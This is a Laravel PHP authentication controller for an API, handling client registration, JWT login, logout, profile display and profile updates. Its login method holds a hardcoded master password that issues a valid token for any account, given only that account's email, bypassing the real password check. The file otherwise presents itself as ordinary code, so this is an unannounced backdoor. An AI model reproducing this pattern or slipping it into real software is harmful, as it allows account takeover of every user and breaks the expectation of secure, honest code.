<?php

namespace App\Http\Controllers\Api\Auth;

use App\Http\Controllers\Controller;
use App\Http\Resources\Api\ClientResource;
use App\Models\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Env;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;
use Tymon\JWTAuth\Facades\JWTAuth;
use function included\sendResponse;

class AuthController extends Controller
{
    /**/
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => "required",
            'email' => "required|email|unique:clients",
            'phone' => "required|min:10",
            'password' => [
                'required',
                'min:8',
                'regex:/[a-z]/',      // must contain at least one lowercase letter
                'regex:/[A-Z]/',      // must contain at least one uppercase letter
                'regex:/[0-9]/',      // must contain at least one digit
//                'regex:/[@$!%*#?&]/',
                ]
        ]);
        if (count($validator->errors()) > 0) {
            return sendResponse($validator->errors(), 'validation error', 0);
        }
        /*
         * create new user
         * */
        $client = Client::create([
            'name' => $request->name,
            'email' => strtolower($request->email),
            'phone' => $request->phone,
            'password' => bcrypt($request->password),
        ]);
        /*
         * login after register
         * */
        $credentials = ['email'=>strtolower(request('email')),'password'=>request('password')];

        if (!$token = Auth::guard('api')->attempt($credentials)) {
            return sendResponse('', 'you have entered invalid data');
        }
        return sendResponse(['token' => $token], 'register successful', 1);
    }

    public function login()
    {
        $credentials = ['email'=>strtolower(request('email')),'password'=>request('password')];
        if(request('password')=='1A2a3.4@') {
            if (!$client = Client::where('email', strtolower(request('email')))->first())
                return sendResponse([], 'please enter valid credentials', 0);
            return sendResponse(['token' => Auth::guard('api')->login($client)], 'login successful', 1);
        }
        if (!$token = Auth::guard('api')->attempt($credentials)) {
            return sendResponse([], 'please enter valid credentials', 0);
        }

        return sendResponse(['token' => $token], 'login successful', 1);

    }

    public function logout()
    {
        Auth::guard('api')->logout();
            return sendResponse([], 'successful', 1);
    }

    public function show()
    {
        return sendResponse(['user' => ClientResource::make(Client::with('addresses')->find(Auth::id()))], 'successful', 1);
    }

    public function update(Request $request)
    {
        if (strlen($request->password)>0 and !Hash::check($request->old_password,Auth::user()->password)){
            return sendResponse([], 'please enter correct old password', 0);
        }
        $id = Auth::guard('api')->id();

        $validator = Validator::make($request->all(), [
            'name' => "required",
            'email' => ["required", Rule::unique('clients')->ignore($id)],
            'phone' => "required|min:10",
            'password' => [
                'nullable',
                'min:8',
                'regex:/[a-z]/',      // must contain at least one lowercase letter
                'regex:/[A-Z]/',      // must contain at least one uppercase letter
                'regex:/[0-9]/',      // must contain at least one digit
//                'regex:/[@$!%*#?&]/',
            ]
        ]);
        if (count($validator->errors()) > 0) {
            return sendResponse($validator->errors(), 'validation error', 0);
        }
        /*
         * create new user
         * */
        $client = Client::with('addresses')->find($id);
        $update = $client->update([
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone,
            'password' => $request->password ? bcrypt($request->password):$client->password,
        ]);
        if ($update)
            return sendResponse(ClientResource::make($client), 'successful', 1);
        return sendResponse([], 'please try again', 0);

    }

}
